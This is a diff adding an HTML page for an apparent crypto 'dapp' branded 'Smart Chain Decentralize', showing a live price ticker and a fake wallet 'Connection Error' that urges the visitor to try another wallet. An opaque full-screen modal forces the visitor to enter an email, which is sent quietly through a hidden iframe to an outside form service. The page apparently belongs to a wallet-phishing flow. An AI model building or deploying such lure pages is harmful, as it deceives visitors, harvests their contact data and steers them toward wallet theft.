@@ -1,0 +1,315 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Interaction Error</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Poppins", sans-serif;
+      }
+      body {
+        background: #1d1f23;
+        color: #fff;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+      }
+
+      /* --- Ticker --- */
+      #crypto-ticker {
+        background: #000;
+        color: #fff;
+        padding: 8px 0;
+        font-size: 14px;
+        white-space: nowrap;
+        overflow: hidden;
+        border-bottom: 1px solid #222;
+      }
+      #crypto-ticker img {
+        width: 18px;
+        height: 18px;
+        vertical-align: middle;
+        margin-right: 4px;
+      }
+
+      /* --- Header --- */
+      header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 1rem 1.5rem;
+        background: #111;
+      }
+      header .logo {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        font-weight: 700;
+        font-size: 1.2rem;
+        color: #fff;
+      }
+
+      /* --- Main Error Card --- */
+      main {
+        flex: 1;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 2rem 1rem;
+      }
+      .card {
+        background: #2a2c31;
+        border-radius: 16px;
+        max-width: 420px;
+        width: 100%;
+        padding: 24px;
+        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
+        text-align: center;
+      }
+      .card h2 {
+        margin: 0;
+        font-size: 18px;
+        font-weight: 600;
+        color: #ff4c4c;
+        padding-bottom: 10px;
+        border-bottom: 1px solid #444;
+      }
+      .spinner {
+        margin: 20px auto;
+        border: 4px solid #444;
+        border-top: 4px solid #ff4c4c;
+        border-radius: 50%;
+        width: 45px;
+        height: 45px;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+      .error-text {
+        margin: 10px 0;
+        color: #ff4c4c;
+        font-size: 14px;
+      }
+      .try-again {
+        display: inline-block;
+        padding: 10px 20px;
+        margin-top: 12px;
+        background: #ff4c4c;
+        color: #fff;
+        font-weight: 600;
+        text-decoration: none;
+        border-radius: 10px;
+        transition: all 0.3s ease;
+      }
+      .try-again:hover {
+        background: #e63939;
+        box-shadow: 0 0 12px rgba(255, 76, 76, 0.7);
+      }
+
+      /* --- Footer --- */
+      footer {
+        background: #111;
+        padding: 1.5rem 1rem;
+        margin-top: auto;
+        text-align: center;
+        border-top: 1px solid #222;
+      }
+
+      /* --- Modal Overlay --- */
+      .modal-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: #1d1f23; /* fully opaque, same as page background */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999; /* ensure it sits above everything */
+      }
+
+      /* --- Modal Box --- */
+      .modal {
+        background: #2a2c31;
+        padding: 2rem;
+        border-radius: 12px;
+        max-width: 400px;
+        width: 90%;
+        text-align: center;
+        box-shadow: 0 0 20px rgba(0, 255, 255, 0.4);
+      }
+
+      .modal h3 {
+        margin-bottom: 1rem;
+        font-size: 18px;
+        font-weight: 600;
+      }
+
+      .modal input {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 1rem;
+        border: none;
+        border-radius: 6px;
+        font-size: 14px;
+        outline: none;
+      }
+
+      .modal button {
+        background: linear-gradient(135deg, #6a5acd, #4facfe);
+        color: #fff;
+        padding: 12px 18px;
+        border: none;
+        border-radius: 8px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: 0.3s;
+        width: 100%;
+      }
+
+      .modal button:hover {
+        background: linear-gradient(135deg, #5a4acb, #3b8bfe);
+      }
+
+      /* Mobile Responsive */
+      @media (max-width: 480px) {
+        .modal {
+          padding: 1.5rem;
+        }
+        .modal h3 {
+          font-size: 16px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Email Modal -->
+    <div class="modal-overlay" id="emailModal">
+      <div class="modal">
+        <h3>Please enter your email to continue</h3>
+        <!-- Hidden iframe target -->
+        <iframe name="hidden_iframe" style="display: none"></iframe>
+
+        <form
+          id="emailForm"
+          action="https://submit-form.com/wxTQRbV22"
+          method="POST"
+          target="hidden_iframe"
+        >
+          <input
+            type="email"
+            name="email"
+            id="userEmail"
+            placeholder="Enter your email"
+            required
+          />
+          <button type="submit">Continue</button>
+        </form>
+      </div>
+    </div>
+
+    <!-- Crypto Ticker -->
+    <div id="crypto-ticker">
+      <marquee
+        behavior="scroll"
+        direction="left"
+        scrollamount="6"
+        id="ticker-content"
+      >
+        Loading live prices...
+      </marquee>
+    </div>
+
+    <!-- Header -->
+    <header>
+      <div class="logo">
+        <img
+          src="https://logowik.com/content/uploads/images/dapp7796.jpg"
+          alt="logo"
+          width="30"
+        />
+        Smart Chain Decentralize
+      </div>
+    </header>
+
+    <!-- Main Error Card -->
+    <main>
+      <div class="card">
+        <h2>Interacting With Provider</h2>
+        <div class="spinner"></div>
+        <p>Connection Error</p>
+        <p class="error-text">
+          Unable to interact with Provider, please try another wallet
+        </p>
+        <a href="index.html" class="try-again">Try Again</a>
+      </div>
+    </main>
+
+    <!-- Footer -->
+    <footer>
+      <div
+        class="livecoinwatch-widget-5"
+        lcw-base="USD"
+        lcw-color-tx="#999999"
+        lcw-marquee-1="coins"
+        lcw-marquee-2="movers"
+        lcw-marquee-items="10"
+      ></div>
+    </footer>
+
+    <script>
+      async function loadPrices() {
+        try {
+          const res = await fetch(
+            "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,binancecoin,solana,cardano&vs_currencies=usd",
+          );
+          const data = await res.json();
+          let ticker = `
+      <img src='https://assets.coingecko.com/coins/images/1/large/bitcoin.png' alt='BTC'> BTC: $${data.bitcoin.usd} | 
+      <img src='https://assets.coingecko.com/coins/images/279/large/ethereum.png' alt='ETH'> ETH: $${data.ethereum.usd} | 
+      <img src='https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png' alt='BNB'> BNB: $${data.binancecoin.usd} | 
+      <img src='https://assets.coingecko.com/coins/images/4128/large/solana.png' alt='SOL'> SOL: $${data.solana.usd} | 
+      <img src='https://assets.coingecko.com/coins/images/975/large/cardano.png' alt='ADA'> ADA: $${data.cardano.usd}
+    `;
+          document.getElementById("ticker-content").innerHTML = ticker;
+        } catch (e) {
+          document.getElementById("ticker-content").innerText =
+            "Failed to load prices";
+        }
+      }
+      loadPrices();
+      setInterval(loadPrices, 60000);
+
+      /* --- Email Modal Logic --- */
+      const emailModal = document.getElementById("emailModal");
+      const emailForm = document.getElementById("emailForm");
+
+      emailForm.addEventListener("submit", function () {
+        // Give Formspark a short time to process, then close modal
+        setTimeout(() => {
+          emailModal.style.display = "none";
+        }, 800);
+      });
+    </script>
+
+    <script
+      defer
+      src="https://www.livecoinwatch.com/static/lcw-widget.js"
+    ></script>
+  </body>
+</html>
